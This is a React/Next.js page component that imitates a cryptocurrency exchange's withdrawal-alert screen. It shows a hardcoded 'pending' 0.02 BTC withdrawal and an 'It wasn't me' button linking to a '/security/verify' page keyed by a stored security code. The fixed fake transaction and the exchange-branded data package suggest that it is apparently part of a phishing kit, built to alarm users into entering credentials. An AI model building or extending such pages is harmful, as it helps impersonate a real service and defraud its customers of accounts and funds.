"use client";
import { Card, CardContent, CardFooter } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Copy, ExternalLink, Circle } from "lucide-react";
import { Banner } from "@/components/core/Banner";
import { CopyRight } from "@/components/core/CopyRight";
import Link from "next/link";
import { SecuritySession } from "@binance/db";
import { useRef } from "react";

interface Props {
  securitySession: SecuritySession; // Replace with the actual type of securitySession
}

export default function ClientOnly({ securitySession }: Props) {
  const currentDate = useRef(new Date());
  const formattedDate = currentDate.current.toLocaleDateString("en-US", {
    year: "numeric",
    month: "2-digit",
    day: "2-digit",
  });
  return (
    <div className="min-h-screen bg-gray-50 flex items-center justify-center p-4">
      <div className="w-full max-w-md">
        <Banner
          securityCode={securitySession.securityCode} // Assuming securitySession has a securityCode property
        />

        <Card className="shadow-lg py-0">
          <CardContent className="py-6">
            <h3 className="text-lg font-medium mb-6 text-gray-700">
              Do you recognize this transaction?
            </h3>

            <div className="space-y-5">
              <div className="flex justify-between items-center">
                <span className="text-gray-500">Status</span>
                <div className="flex items-center">
                  <Circle className="h-2.5 w-2.5 fill-primary/90 text-primary mr-2" />
                  <span className="text-gray-700">Pending</span>
                </div>
              </div>

              <div className="flex justify-between items-center">
                <span className="text-gray-500">Date</span>
                <span className="text-gray-700">{formattedDate}</span>
              </div>

              <div className="flex justify-between items-center">
                <span className="text-gray-500">Coin</span>
                <span className="text-gray-700">BTC</span>
              </div>

              <div className="flex justify-between items-center">
                <span className="text-gray-500">Withdraw amount</span>
                <span className="text-gray-700">0.02</span>
              </div>

              <div className="flex justify-between items-center">
                <span className="text-gray-500">Network</span>
                <span className="text-gray-700">Bitcoin</span>
              </div>

              <div className="flex justify-between items-center">
                <span className="text-gray-500">Address</span>
                <div className="flex items-center flex-wrap justify-end text-gray-700">
                  <span className="truncate max-w-[180px]">
                    1A1zP1eP5QGefi2DMPTf...
                  </span>
                  <div>
                    <button className="ml-1 text-primary hover:text-primary/80">
                      <Copy className="h-4 w-4" />
                    </button>
                    <button className="ml-1 text-primary hover:text-primary/80">
                      <ExternalLink className="h-4 w-4" />
                    </button>
                  </div>
                </div>
              </div>
            </div>
          </CardContent>

          <CardFooter className="flex p-0">
            <Button
              variant="ghost"
              className="flex-1 h-14 rounded-none rounded-bl-lg border-t border-r text-primary hover:text-yellow-600 hover:bg-yellow-50"
            >
              It was me
            </Button>
            <Button
              className="flex-1 h-14 rounded-none rounded-br-lg border-t bg-red-500 hover:bg-red-600"
              asChild
            >
              <Link
                href={
                  "/security/verify?security_code=" +
                  securitySession.securityCode
                }
                className="flex items-center justify-center text-white"
              >
                It wasn&apos;t me
              </Link>
            </Button>
          </CardFooter>
        </Card>

        <CopyRight />
      </div>
    </div>
  );
}
